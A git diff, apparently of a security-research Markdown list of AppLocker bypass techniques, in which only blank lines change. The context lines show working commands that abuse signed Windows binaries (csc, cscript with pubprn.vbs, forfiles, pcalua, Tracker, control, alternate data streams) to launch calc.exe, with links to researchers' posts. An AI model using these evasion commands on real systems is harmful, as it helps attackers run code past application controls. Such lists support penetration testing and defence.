@@ -50,6 +50,8 @@ https://youtu.be/jDuENcSRN1E
 
 ## POC：
 
+
+
 ## 1.csc.exe
 ``` tex
 c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:Output\secist.exe Output\secist.cs &&  Output\secist.exe
@@ -83,6 +85,7 @@ https://github.com/milkdevil/UltimateAppLockerByPassList
 
 
 
+
 ## 2.cscript
 
 ``` code
@@ -102,6 +105,7 @@ cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "s
 Links:
 https://twitter.com/enigma0x3/status/923311244358094848
 https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt
+
 
 
 
@@ -186,11 +190,15 @@ https://github.com/re4lity/subTee-gits-backups
 
 
 
+
 ## 4.CL_Invocation.ps1
 ``` stylus
 "powershell.exe Get-AuthenticodeSignature C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;SyncInvoke  calc.exe
 ```
 Link: https://twitter.com/bohops/status/948061991012327424
+
+
+
 
 
 ## 5.forfiles
@@ -200,6 +208,10 @@ forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
 ```
 Link：
 https://twitter.com/Evi1cg/status/935027922397573120
+
+
+
+
 
 
 ## 6.mshta.exe
@@ -212,11 +224,18 @@ Link: https://twitter.com/subTee/status/953990877264994304
 
 
 
+
+
+
+
 ## 7.pcalua.exe
 ``` stylus
 c:\Windows\System32\pcalua.exe -a calc.exe
 ```
 Link:  https://twitter.com/KyleHanslovan/status/912659279806640128
+
+
+
 
 
 
@@ -234,6 +253,10 @@ using System;System.Diagnostics.Process.Start("calc.exe");
 ```
 
 Link:  https://github.com/milkdevil/UltimateAppLockerByPassList
+
+
+
+
 
 
 
@@ -281,6 +304,12 @@ Link:  https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
 https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html
 
 
+
+
+
+
+
+
 ## 10.Tracker 
 
 ``` stylus
@@ -290,7 +319,16 @@ Tracker.exe /d runcalc.dll /c cmd
 link https://twitter.com/Sudhanshu_C/status/943011972261412864
 https://twitter.com/subTee/status/793151392185589760
 
+
+
+
+
+
 ## 11.control  .\example\runcalc.dll
+
+
+
+
 
 
 ## 12.type .\example\runcalc.dll >  .\example\demon:secist.dll | control   .\example\demon:secist.dll
